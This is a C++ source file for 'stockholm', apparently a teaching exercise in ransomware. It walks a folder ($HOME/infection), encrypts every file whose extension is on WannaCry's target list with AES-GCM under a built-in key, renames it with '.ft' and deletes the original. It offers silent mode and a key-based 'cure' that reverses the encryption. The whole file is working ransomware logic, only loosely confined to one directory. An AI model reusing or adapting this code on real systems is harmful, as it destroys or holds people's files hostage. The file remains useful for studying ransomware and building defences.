# include "include/crypto.hpp"

const char* const wannacryExtensions[] = {
	".123", ".602", ".doc", ".3dm", ".3ds", ".3g2", ".3gp",
	".7z", ".accdb", ".aes", ".ai", ".ARC", ".asc", ".asf",
	".asm", ".asp", ".avi", ".backup", ".bak", ".bat", ".bmp",
	".brd", ".bz2", ".c", ".cgm", ".class", ".cmd", ".cpp",
	".crt", ".cs", ".csr", ".csv", ".db", ".dbf", ".dch",
	".der", ".dif", ".dip", ".djvu", ".docb", ".docm", ".docx",
	".dot", ".dotm", ".dotx", ".dwg", ".edb", ".eml", ".fla",
	".flv", ".frm", ".gif", ".gpg", ".gz", ".h", ".hwp",
	".ibd", ".iso", ".jar", ".java", ".jpeg", ".jpg", ".js",
	".jsp", ".key", ".lay", ".lay6", ".ldf", ".m3u", ".m4u",
	".max", ".mdb", ".mdf", ".mid", ".mkv", ".mml", ".mov",
	".mp3", ".mp4", ".mpeg", ".mpg", ".msg", ".myd", ".myi",
	".nef", ".odb", ".odg", ".odp", ".ods", ".odt", ".onetoc2",
	".ost", ".otg", ".otp", ".ots", ".ott", ".p12", ".PAQ",
	".pas", ".pdf", ".pem", ".pfx", ".php", ".pl", ".png",
	".pot", ".potm", ".potx", ".ppam", ".pps", ".ppsm", ".ppsx",
	".ppt", ".pptm", ".pptx", ".ps1", ".psd", ".pst", ".rar",
	".raw", ".rb", ".rtf", ".sch", ".sh", ".sldm", ".sldx",
	".slk", ".sln", ".snt", ".sql", ".sqlite3", ".sqlitedb",
	".stc", ".std", ".sti", ".stw", ".suo", ".svg", ".swf",
	".sxc", ".sxd", ".sxi", ".sxm", ".sxw", ".tar", ".tbk",
	".tgz", ".tif", ".tiff", ".txt", ".uop", ".uot", ".vb",
	".vbs", ".vcd", ".vdi", ".vmdk", ".vmx", ".vob", ".vsd",
	".vsdx", ".wav", ".wb2", ".wk1", ".wks", ".wma", ".wmv",
	".xlc", ".xlm", ".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt",
	".xltm", ".xltx", ".xlw", ".zip"
};

void displayUsage(void)
{
	std::cout << "\033[1;36mUsage:\033[0m ./stockholm [OPTION]" << std::endl;
	std::cout << std::endl;

	std::cout << "\033[1;33mOptions:\033[0m" << std::endl;
	std::cout << "  \033[32m-h, --help\033[0m	  Display this help message" << std::endl;
	std::cout << "  \033[32m-v, --version\033[0m  Display the program version" << std::endl;
	std::cout << "  \033[32m-r, --reverse\033[0m  Reverse the encryption using a key" << std::endl;
	std::cout << "  \033[32m-s, --silent\033[0m   Suppress all output" << std::endl;
	std::cout << std::endl;

	std::cout << "\033[1;33mDescription:\033[0m" << std::endl;
	std::cout << "  Encrypts eligible files in \033[36m$HOME/infection\033[0m using a key." << std::endl;
	std::cout << "  Encrypted files receive the \033[35m.ft\033[0m extension." << std::endl;
	std::cout << "  Use \033[32m--reverse\033[0m with the original key to restore files." << std::endl;
	std::cout << std::endl;

	std::cout << "\033[1;33mExamples:\033[0m" << std::endl;
	std::cout << "  \033[36m./stockholm --help\033[0m" << std::endl;
	std::cout << "  \033[36m./stockholm --version\033[0m" << std::endl;
	std::cout << "  \033[36m./stockholm --reverse\033[0m \"your-key-of-at-least-16-chars\"" << std::endl;
	std::cout << "  \033[36m./stockholm --silent\033[0m" << std::endl;

	exit(0);
}

void displayVersion(void)
{
	std::cout << "Version of stockholm \033[1;33m" << PROGRAM_VERSION << "\033[0m" << std::endl;
	exit(0);
}

bool isExtensionValid(const std::string& extension)
{
	return std::find(std::begin(wannacryExtensions), std::end(wannacryExtensions), extension) != std::end(wannacryExtensions);
}

std::vector<uint8_t> readFile(const std::string& filename)
{
	std::ifstream file(filename, std::ios::binary);

	if (!file)
		throw std::runtime_error("Cannot open file for reading");

	return std::vector<uint8_t>(
		std::istreambuf_iterator<char>(file),
		std::istreambuf_iterator<char>()
	);
}

void writeFile(const std::string& filename, const std::vector<uint8_t>& data)
{
	std::ofstream file(filename, std::ios::binary);

	if (!file)
		throw std::runtime_error("Cannot open file for writing");

	file.write(reinterpret_cast<const char*>(data.data()), static_cast<std::streamsize>(data.size()));

	if (!file)
		throw std::runtime_error("File write failed");
}

void encryptFile(const std::string& inputFile, const std::string& outputFile, const std::string& password)
{
	auto plaintext = readFile(inputFile);

	std::array<uint8_t, SALT_LEN> salt{};

	if (RAND_bytes(salt.data(), SALT_LEN) != 1)
		throw std::runtime_error("Salt generation failed");

	auto key = deriveAesKey(password, salt);

	std::array<uint8_t, GCM_IV_LEN> iv{};
	auto ciphertext = aesGcmEncrypt(plaintext, key, iv);

	std::vector<uint8_t> output;

	output.insert(output.end(), salt.begin(), salt.end());
	output.insert(output.end(), iv.begin(), iv.end());
	output.insert(output.end(), ciphertext.begin(), ciphertext.end());

	writeFile(outputFile, output);
}

void decryptFile(const std::string& inputFile, const std::string& outputFile, const std::string& password)
{
	auto encrypted = readFile(inputFile);

	constexpr size_t HEADER_SIZE = SALT_LEN + GCM_IV_LEN;

	if (encrypted.size() < HEADER_SIZE + GCM_TAG_LEN)
		throw std::runtime_error("Invalid encrypted file");

	std::array<uint8_t, SALT_LEN> salt{};

	std::copy_n(encrypted.begin(), SALT_LEN, salt.begin());

	std::array<uint8_t, GCM_IV_LEN> iv{};

	std::copy_n(encrypted.begin() + SALT_LEN, GCM_IV_LEN, iv.begin());

	auto key = deriveAesKey(password, salt);

	std::vector<uint8_t> ciphertext(encrypted.begin() + HEADER_SIZE, encrypted.end());

	auto plaintext = aesGcmDecrypt(ciphertext, key, iv);

	writeFile(outputFile, plaintext);
}

void cureInfection(std::string cure, bool isSilenced)
{
	try
	{
		for (const auto& entry : std::filesystem::directory_iterator(INFECTION_DIR))
		{
			std::string filename = entry.path().filename().string();

			if (!isSilenced)
				std::cout << "Curing " << filename << std::endl;

			size_t pos = filename.find(".ft");

			if (pos != std::string::npos)
				filename.erase(pos, 3);

			std::string curedFile = INFECTION_DIR + filename;

			decryptFile(INFECTION_DIR + filename + ".ft", curedFile, cure);

			std::filesystem::remove(entry);
		}
	}
	catch (const std::exception& e)
	{
		if (!isSilenced)
			std::cerr << "Cure error: " << e.what() << std::endl;
	}
}

void infect(bool isSilenced)
{
	try
	{
		for (const auto& entry : std::filesystem::directory_iterator(INFECTION_DIR))
		{
			std::string fileExtension = entry.path().filename().extension().string();

			if (isExtensionValid(fileExtension))
			{
				std::string filename = entry.path().filename().string();

				if (!isSilenced)
					std::cout << "Infecting " << filename << std::endl;

				std::string infectedFile = INFECTION_DIR + filename;
				if (infectedFile.find(".ft") == std::string::npos)
					infectedFile += ".ft";

				encryptFile(INFECTION_DIR + filename, infectedFile, INFECTION_KEY);

				std::filesystem::remove(entry);
			}
		}
	}
	catch (const std::exception& e)
	{
		if (!isSilenced)
			std::cerr << "Infection error: " << e.what() << std::endl;
	}
}

void parseArgs(int argc, char **argv)
{
	bool 		isSilenced = false;
	std::string	key = "";

	for (int i = 1; i < argc; i++)
	{
		std::string arg = argv[i];

		if (arg == "-h" || arg == "-help")
			displayUsage();
		if (arg == "-v" || arg == "-version")
			displayVersion();
		if (arg == "-s" || arg == "-silent")
			isSilenced = true;
		if (arg == "-r" || arg == "-reverse")
		{
			if (!argv[i + 1])
			{
				std::cerr << "-r flag requires a key after it" << std::endl;
				exit(1);
			}

			key = argv[i + 1];
			if (key.length() < 16)
			{
				std::cerr << "Key has to be at least 16 characters long" << std::endl;
				exit(1);
			}
		}
	}
	if (!key.empty()) 
		cureInfection(key, isSilenced);
	else
		infect(isSilenced);
}

int main (int argc, char **argv)
{
	parseArgs(argc, argv);
	return (0);
}